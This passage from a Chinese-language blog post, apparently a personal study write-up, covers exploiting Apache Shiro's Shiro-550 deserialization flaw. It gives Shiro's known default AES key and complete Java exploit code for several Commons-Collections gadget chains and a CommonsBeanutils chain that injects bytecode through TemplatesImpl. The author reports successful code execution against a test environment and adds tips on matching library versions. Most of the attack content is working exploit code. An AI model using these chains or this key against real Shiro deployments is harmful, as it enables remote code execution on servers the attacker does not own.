pycryptodome<br></code></pre></td></tr></table></figure><p>然后需要去c:\users\86189\appdata\local\programs\python\python37\lib\site-packages路径下将一个crypto的文件夹的c改成大写的C即可</p></blockquote><p><strong>固定密钥</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">kPH+bIxk5D2deZiIxcaaaA==<br></code></pre></td></tr></table></figure><p>我们可以先打一个cc6的链子试一试</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc6_demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<span class="hljs-comment">//这里先随便赋一个值后面改回来</span><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<span class="hljs-comment">//这里待会调用的时候会在mpa新增加一个键值对aaa</span><br>        Map&lt;Object,Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">lazyMapClass</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        Field trans=lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        trans.setAccessible(<span class="hljs-literal">true</span>);<br>        trans.set(lazyMap,chainedTransformer);<span class="hljs-comment">//这里改回来chainedTransformer</span><br>        map.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<span class="hljs-comment">//移除掉我们新增的键值</span><br><br>        serialize(hashMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后将生成的ser.bin文件进行aes加密后再base64进行传参</p><blockquote><p>这里我一开始试了一下用cyberchef来加密发现不行，还是得用上面的脚本</p></blockquote><p>先看一下正常的：</p><p><img src="http://cdn.clown2024.cn/202407151444243.png" alt="image-20240614215924819"></p><p>打了cc6的：</p><p><img src="http://cdn.clown2024.cn/202407151444244.png" alt="image-20240614220816682"></p><p>这里就是没登录上去是正常的，后端开启debug去看一下，这时候应该是有报错的</p><p><img src="http://cdn.clown2024.cn/202407151444245.png" alt="image-20240614232811726"></p><p>这里是反序列化抛了异常，说是无法加载invokerTransformer，就是由于shiro无法处理数组导致的，后面再说，比较复杂</p><blockquote><p>但是这里报错的又不太对啊，他是cc的全部类都无法加载，太怪了</p></blockquote><p>所以这里我们就需要改一下链子，改成不用chainedTransformer数组的形式，也就是拼一下链子就好，然后最后要改成<strong>动态类加载执行任意代码的方式</strong></p><p>这里使用<strong>cc2+cc6+cc3</strong>的方式进行拼接</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shiro_ccDemo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//cc3</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">//利用反射设置需要满足的值</span><br>        Class c=templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\code\\cc_chain\\src\\main\\java\\com.proxy\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br>        <span class="hljs-comment">//cc2</span><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>        <span class="hljs-comment">//cc6</span><br>        Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<span class="hljs-comment">//这里先随便赋一个值后面改回来</span><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, templates);<span class="hljs-comment">//这里要添加进去templates</span><br>        Map&lt;Object,Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">lazyMapClass</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        Field trans=lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        trans.setAccessible(<span class="hljs-literal">true</span>);<br>        trans.set(lazyMap,invokerTransformer);<span class="hljs-comment">//这里改回来chainedTransformer</span><br>        map.remove(templates);<span class="hljs-comment">//移除掉我们新增的键值</span><br><br>        serialize(hashMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>服了这里也没打通，后台直接报错TiedMapEntry都无法加载</p><p>后来我用了p神的环境就能打通了，估计还是cc依赖运行时没有被编译进去</p><p>这是p神的环境：<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></p><p><img src="http://cdn.clown2024.cn/202407151444246.png" alt="image-20240615104853896"></p><blockquote><p>打的时候要去掉<strong>JSESSIONID</strong></p></blockquote><h2 id="打cb链"><a href="#打CB链" class="headerlink" title="打CB链"></a>打CB链</h2><p>CB链打的是shiro自带的依赖：commons-beanutils（就是对javabean的增强类），这里注意一下版本是1.8.3的，本地写exp的时候记得版本也要一致，不然会打不通</p><p>下面是一个简单的javaBean的例子</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shiro_CBDemo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-number">10</span>,<span class="hljs-string">&quot;aa&quot;</span>);<br>        System.out.println(PropertyUtils.getProperty(person, <span class="hljs-string">&quot;age&quot;</span>));<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们可以不需要再去调用get方法来获取属性值，而是直接用PropertyUtils的静态方法来获取</p><p>然后在这处理的过程中就存在反序列化的点，就直接说了反序列化的点就是会调用javaBean的get方法，比如上面的age就会调用<strong>getAge</strong>方法</p><p>我们可以调试跟进去看一下我们传入了name为”age”之后发生了什么</p><p>一路跟进下去，会在一个getSimpleProperty的方法里面获取到javaBean的各种方法，然后会把我们传进去的名字从小写改成大写</p><blockquote><p>而且我们这里不传大写的属性名进去，不然会报错</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151444247.png" alt="image-20240615093151593"></p><p>再往下两行，他就获取了读取属性的get方法，然后进行函数调用，获取了age的值</p><p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240615093518572.png" alt="image-20240615093518572"></p><p>我们传进去的javaBean最终就会变成我们指定的属性的值然后返回</p><p><img src="http://cdn.clown2024.cn/202407151444248.png" alt="image-20240615093640915"></p><p><img src="http://cdn.clown2024.cn/202407151444249.png" alt="image-20240615093725798"></p><p>这里其中存在的利用点就是这个get方法的调用</p><h3 id="templatesimpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>这里就跟我们动态类加载任意代码的这个类有关</p><p>它里面有一个<strong>getOutputProperties()<strong>的方法，这个方法的就很符合javaBean的方式，最重要的是它里面还调用了</strong>newTransformer</strong>这个方法</p><p><img src="http://cdn.clown2024.cn/202407151444250.png" alt="image-20240615094412956"></p><p>所以我们只需要传一个<strong>outputProperties</strong>的名字进去就可以调用这个方法，记得这里一定要是<strong>小写</strong>的形式</p><h3 id="beancomparator"><a href="#BeanComparator" class="headerlink" title="BeanComparator"></a>BeanComparator</h3><p>接下来就是从<strong>ProperUtils</strong>往上找看谁调用了他的<strong>getProperty</strong>方法</p><p>这里就找到BeanComparator的compare方法</p><p><img src="http://cdn.clown2024.cn/202407151444251.png" alt="image-20240615094845997"></p><p>看一下他的构造方法</p><p><img src="http://cdn.clown2024.cn/202407151444252.png" alt="image-20240615095155801"></p><p>这里也提前说一下，我们需要调用下面的构造方法，而不能调用上面的，因为上面的ComparableComparator是属于Commoms-Collections里面的方法，而shiro自带是没有这个的，我们打了就会报错</p><p>所以这里comparator我们就需要赋值一个java本身就有的而且是继承了序列化接口的类，这里直接用组长视频里面用的那个<strong>AttrCompare</strong>类</p><h3 id="priorityqueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h3><p>见到这个compare就很熟悉了，我们的cc2和cc4里面就是利用了PriorityQueue的readObject方法，然后里面调用compare方法的，那链子就基本串起来了</p><p>现在可以来写一个exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.cc_chain.shiro_cb;<br><br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shiro_CBDemo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><span class="hljs-comment">//        Person person = new Person(10,&quot;aa&quot;);</span><br><span class="hljs-comment">//        System.out.println(PropertyUtils.getProperty(person, &quot;age&quot;));</span><br>        <span class="hljs-comment">//cc3</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">//利用反射设置需要满足的值</span><br>        Class c=templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\code\\cc_chain\\src\\main\\java\\com.proxy\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br><span class="hljs-comment">//        Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="hljs-comment">//        tfactory.setAccessible(true);</span><br><span class="hljs-comment">//        tfactory.set(templates,new TransformerFactoryImpl());</span><br>        <span class="hljs-comment">//CB</span><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br>        <span class="hljs-comment">//cc2</span><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<span class="hljs-comment">//先传一个没用东西阻断链子执行</span><br>        PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>        <span class="hljs-comment">//这里的size要满足要求才能触发调用链执行，这里需要改用添加元素才行，因为我们的templates还没有加入进去</span><br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">//然后反射修改回来priorityQueue的值</span><br>        Class p=PriorityQueue.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> p.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparator.setAccessible(<span class="hljs-literal">true</span>);<br>        comparator.set(priorityQueue,beanComparator);<br><br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里用了比较懒的改法，直接借用了一下cc4这个类，主要是为了序列化能成功，本地测试无所谓，其他改法调了半天都报错懒得调了。。。</p><p><img src="http://cdn.clown2024.cn/202407151444253.png" alt="image-20240615103205401"></p><p><strong>打一下shiro看看效果</strong></p><p><img src="http://cdn.clown2024.cn/202407151444254.png" alt="image-20240615103608867"></p><p>可以成功打通</p><blockquote><p>注意这里如果用ysoserial生成的payload打是打不通的，因为他的CB版本和shiro的不一样</p><p>这里用的官方环境没有删掉<strong>JSESSIONID</strong>竟然也通了（</p></blockquote><h3 id="cb链调用图"><a href="#CB链调用图" class="headerlink" title="CB链调用图"></a>CB链调用图</h3><p><img src="http://cdn.clown2024.cn/202407151444255.png" alt="image-20240615001956606"></p><h1 id="shiro721"><a href="#Shiro721" class="headerlink" title="Shiro721"></a>Shiro721</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;shiro介绍&quot;&gt;&lt;a href=&quot;#Shiro介绍&quot; class=&quot;headerlink&quot; title=&quot;Shiro介绍&quot;&gt;&lt;/a&gt;Shiro介绍&lt;/h1&gt;&lt;p&gt;直接问kimi给出的大致介绍&lt;/p&gt;
&lt;p&gt;Apache Shiro是一个强大且易于使用的Java安</summary>
      
    
    
    
    <category term="java漏洞" scheme="https://clowsman.github.io/categories/java%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="java反序列化" scheme="https://clowsman.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
</feed>
